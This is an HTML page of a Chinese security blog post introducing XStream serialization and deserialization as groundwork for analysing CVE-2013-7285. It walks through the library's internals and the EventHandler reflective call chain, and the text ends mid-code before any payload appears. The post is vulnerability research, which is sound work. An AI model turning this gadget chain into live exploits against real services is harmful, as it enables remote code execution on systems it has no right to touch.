@@ -1,0 +1,992 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="且将新火试新茶，诗酒趁年华">
+    <meta name="author" content="Drunkbaby">
+    
+    <title>
+        
+            Java 反序列化之 XStream 反序列化-01 |
+        
+        Drunkbaby&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"drun1baby.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png","favicon":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png","avatar":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png","font_size":"15px","font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"且将新火试新茶，诗酒趁年华","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"enable":true,"appid":"mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va","appkey":"ermlV1eoB1YODT088EdXjo6C","placeholder":"just go go","background":"/images/comment_bg.png","count":true},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Drunkbaby&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">Java 反序列化之 XStream 反序列化-01</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Drunkbaby</span>
+                            
+                                <span class="author-label">Lv6</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-04-18 22:01:03</span>
+        <span class="mobile">2023-04-18 22:01</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-06-22 18:15:21</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Java/">Java</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Java/">Java</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>3.3k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>13 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <p>主要是了解一下 XStream 的运行流程，分析 CVE-2013-7285</p>
+<span id="more"></span>
+
+<h1 id="Java-反序列化之-XStream-反序列化（一）"><a href="#Java-反序列化之-XStream-反序列化（一）" class="headerlink" title="Java 反序列化之 XStream 反序列化（一）"></a>Java 反序列化之 XStream 反序列化（一）</h1><h2 id="0x01-XStream-基础"><a href="#0x01-XStream-基础" class="headerlink" title="0x01 XStream 基础"></a>0x01 XStream 基础</h2><h3 id="XStream-简介"><a href="#XStream-简介" class="headerlink" title="XStream 简介"></a>XStream 简介</h3><p>XStream 是一个简单的基于 Java 库，Java 对象序列化到 XML，反之亦然(即：可以轻易的将 Java 对象和 XML 文档相互转换)。</p>
+<h3 id="使用-XStream-实现序列化与反序列化"><a href="#使用-XStream-实现序列化与反序列化" class="headerlink" title="使用 XStream 实现序列化与反序列化"></a>使用 XStream 实现序列化与反序列化</h3><p>下面看下如何使用 XStream 进行序列化和反序列化操作的。</p>
+<p>先定义接口类</p>
+<p><strong>IPerson.java</strong></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">IPerson</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">void</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>接着定义 Person 类实现前面的接口：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token keyword">implements</span> <span class="token class-name">IPerson</span> <span class="token punctuation">&#123;</span>  
+    <span class="token class-name">String</span> name<span class="token punctuation">;</span>  
+    <span class="token keyword">int</span> age<span class="token punctuation">;</span>  
+  
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Hello, this is "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">+</span> <span class="token string">", age "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>XStream 序列化是调用 <code>XStream.toXML()</code> 来实现的：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Serialize</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        p<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>  
+        p<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"Drunkbaby"</span><span class="token punctuation">;</span>  
+        <span class="token class-name">XStream</span> xstream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">DomDriver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token class-name">String</span> xml <span class="token operator">=</span> xstream<span class="token punctuation">.</span><span class="token function">toXML</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/serialize.png" class="">
+
+<p>XStream 反序列化是用过调用 <code>XStream.fromXML()</code> 来实现的，其中获取 XML 文件内容的方式可以通过 <code>Scanner()</code> 或 <code>FileInputStream</code> 都可以：</p>
+<p><strong>Deserialize.java</strong></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>thoughtworks<span class="token punctuation">.</span>xstream<span class="token punctuation">.</span></span><span class="token class-name">XStream</span></span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>thoughtworks<span class="token punctuation">.</span>xstream<span class="token punctuation">.</span>io<span class="token punctuation">.</span>xml<span class="token punctuation">.</span></span><span class="token class-name">DomDriver</span></span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span></span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileNotFoundException</span></span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span></span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Deserialize</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">FileNotFoundException</span> <span class="token punctuation">&#123;</span>  
+<span class="token comment">//        String xml = new Scanner(new File("person.xml")).useDelimiter("\\Z").next();  </span>
+        <span class="token class-name">FileInputStream</span> xml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"G:\\OneDrive - yapuu\\Java安全学习\\JavaSecurityLearning\\JavaSecurity\\XStream\\XStream\\XStream-Basic\\src\\main\\java\\person.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token class-name">XStream</span> xstream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">DomDriver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">)</span> xstream<span class="token punctuation">.</span><span class="token function">fromXML</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        p<span class="token punctuation">.</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/Deserialize.png" class="">
+
+<h3 id="XStream-几个部分"><a href="#XStream-几个部分" class="headerlink" title="XStream 几个部分"></a>XStream 几个部分</h3><p>XStream 类图，参考<a class="link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/387c568faf62" >XStream 源码解析<i class="fas fa-external-link-alt"></i></a>：</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/XStreamDiagram.png" class="">
+
+<p>主要分为四个部分：</p>
+<h4 id="MarshallingStrategy-编码策略"><a href="#MarshallingStrategy-编码策略" class="headerlink" title="MarshallingStrategy 编码策略"></a>MarshallingStrategy 编码策略</h4><ul>
+<li>marshall : object-&gt;xml 编码</li>
+<li>unmarshall : xml-&gt; object 解码</li>
+</ul>
+<p>两个重要的实现类：</p>
+<ul>
+<li><code>com.thoughtworks.xstream.core.TreeMarshaller</code> : 树编组程序 </li>
+<li>调用 Mapper 和 Converter 把 XML 转化成 Java 对象</li>
+</ul>
+<blockquote>
+<p>其中的 start 方法开始编组</p>
+</blockquote>
+<p>其中调用了 <code>this.convertAnother(item)</code> 方法</p>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/start.png" class="">
+
+<blockquote>
+<p>convertAnother 方法的作用是把 XML 转化成 Java 对象。</p>
+</blockquote>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/convertAnother.png" class="">
+
+<h4 id="Mapper-映射器"><a href="#Mapper-映射器" class="headerlink" title="Mapper 映射器"></a>Mapper 映射器</h4><img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/Mapper.png" class="">
+
+<p>简单来说就是通过 mapper 获取对象对应的类、成员、Field 属性的 Class 对象，赋值给 XML 的标签字段。</p>
+<h4 id="Converter-转换器"><a href="#Converter-转换器" class="headerlink" title="Converter 转换器"></a>Converter 转换器</h4><p>XStream 为 Java 常见的类型提供了 Converter 转换器。转换器注册中心是 XStream 组成的核心部分。</p>
+<p>转换器的职责是提供一种策略，用于将对象图中找到的特定类型的对象转换为 XML 或将 XML 转换为对象。</p>
+<p>简单地说，就是输入 XML 后它能识别其中的标签字段并转换为相应的对象，反之亦然。</p>
+<p>转换器需要实现 3 个方法，这三个方法分别是来自于 <code>Converter</code> 类以及它的父类 <code>ConverterMatcher</code></p>
+<ul>
+<li>canConvert 方法：告诉 XStream 对象，它能够转换的对象；</li>
+<li>marshal 方法：能够将对象转换为 XML 时候的具体操作；</li>
+<li>unmarshal 方法：能够将 XML 转换为对象时的具体操作；</li>
+</ul>
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/ConverterMatcher.png" class="">
+
+<img src="/2023/04/18/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-XStream-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/Converter.png" class="">
+
+<p>具体参考：<a class="link"   target="_blank" rel="noopener" href="http://x-stream.github.io/converters.html" >http://x-stream.github.io/converters.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>这里告诉了我们针对各种对象，XStream 都做了哪些支持。</p>
+<h4 id="EventHandler-类"><a href="#EventHandler-类" class="headerlink" title="EventHandler 类"></a>EventHandler 类</h4><p>EventHandler 类为动态生成事件侦听器提供支持，这些侦听器的方法执行一条涉及传入事件对象和目标对象的简单语句。</p>
+<p>EventHandler 类是实现了 InvocationHandler 的一个类，设计本意是为交互工具提供 beans，建立从用户界面到应用程序逻辑的连接。</p>
+<p>EventHandler 类定义的代码如下，其含有 target 和 action 属性，在 <code>EventHandler.invoke()-&gt;EventHandler.invokeInternal()-&gt;MethodUtil.invoke()</code> 的函数调用链中，会将前面两个属性作为类方法和参数继续反射调用：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EventHandler</span> <span class="token keyword">implements</span> <span class="token class-name">InvocationHandler</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">private</span> <span class="token class-name">Object</span> target<span class="token punctuation">;</span>  
+    <span class="token keyword">private</span> <span class="token class-name">String</span> action<span class="token punctuation">;</span>  
+	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  
+	  
+	<span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Object</span> proxy<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token keyword">final</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arguments<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  
+                <span class="token keyword">return</span> <span class="token function">invokeInternal</span><span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> method<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  
+    <span class="token punctuation">&#125;</span>  
+      
+	<span class="token keyword">private</span> <span class="token class-name">Object</span> <span class="token function">invokeInternal</span><span class="token punctuation">(</span><span class="token class-name">Object</span> proxy<span class="token punctuation">,</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arguments<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  
+              
+                <span class="token class-name">Method</span> targetMethod <span class="token operator">=</span> <span class="token class-name">Statement</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>  
+                             target<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> action<span class="token punctuation">,</span> argTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  
+                <span class="token keyword">return</span> <span class="token class-name">MethodUtil</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>targetMethod<span class="token punctuation">,</span> target<span class="token punctuation">,</span> newArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>  
+            <span class="token punctuation">&#125;</span>  
+            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  
+    <span class="token punctuation">&#125;</span>  
+  
+	<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里重点看下 <code>EventHandler.invokeInternal()</code> 函数的代码逻辑，如注释：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">Object</span> <span class="token function">invokeInternal</span><span class="token punctuation">(</span><span class="token class-name">Object</span> var1<span class="token punctuation">,</span> <span class="token class-name">Method</span> var2<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+<span class="token comment">//-------------------------------------part1----------------------------------  </span>
+<span class="token comment">//作用:获取interface的name,即获得Comparable,检查name是否等于以下3个名称  </span>
+        <span class="token class-name">String</span> var4 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">getDeclaringClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">identityHashCode</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+            <span class="token punctuation">&#125;</span>  
+  
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"equals"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+                <span class="token keyword">return</span> var1 <span class="token operator">==</span> var3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token constant">TRUE</span> <span class="token operator">:</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token constant">FALSE</span><span class="token punctuation">;</span>  
+            <span class="token punctuation">&#125;</span>  
+  
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"toString"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+                <span class="token keyword">return</span> var1<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token char">'@'</span> <span class="token operator">+</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toHexString</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+            <span class="token punctuation">&#125;</span>  
+        <span class="token punctuation">&#125;</span>  
+<span class="token comment">//-------------------------------------part2----------------------------------  </span>
+<span class="token comment">//貌似获取了一个class和object  </span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>listenerMethodName <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>listenerMethodName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  
+            <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var5 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  
+            <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var6 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>eventPropertyName <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+                var6 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
+                var5 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  
+            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  
